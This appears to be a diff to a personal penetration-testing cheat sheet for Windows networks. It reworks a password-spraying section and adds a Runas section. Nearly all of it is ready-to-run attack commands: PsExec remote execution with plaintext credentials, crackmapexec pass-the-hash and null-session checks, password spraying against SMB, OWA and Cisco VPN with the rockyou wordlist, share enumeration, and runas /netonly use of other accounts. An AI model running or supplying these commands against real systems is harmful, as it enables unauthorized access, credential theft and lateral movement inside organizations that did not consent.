@@ -1,4 +1,4 @@
-### lateral movement
+### Crackmapexec
 ```
 PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd 
 psexec \\192.168.122.66 -u Administrator -p 123456Ww ipconfig
@@ -67,14 +67,20 @@ proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
  ### Password Spraying Attack 
 ```
 
-| crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
-| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
-| crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
-|crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
-|spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
-|spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
-|spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
-|./atomizer.py owa contoso.com 'Fall2018' emails.txt|
+crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt
+smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
+crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH 
+crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions
+spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp
+spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
+spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
+python atomizer.py owa contoso.com 'Fall2018' emails.txt
 ```
-
+### Runas
+```
+runas /netonly /user:nyameeeain "C:\Windows\System32\calc.exe"
+runas /netonly /user:nyameeeain powershell
+runas /netonly /user:nyameeeain "C:\Program Files\HeidiSQL\heidisql.exe"
+runas /netonly /user:insomnia\nyameeeain "C:\Windows\System32\calc.exe"
+```
 
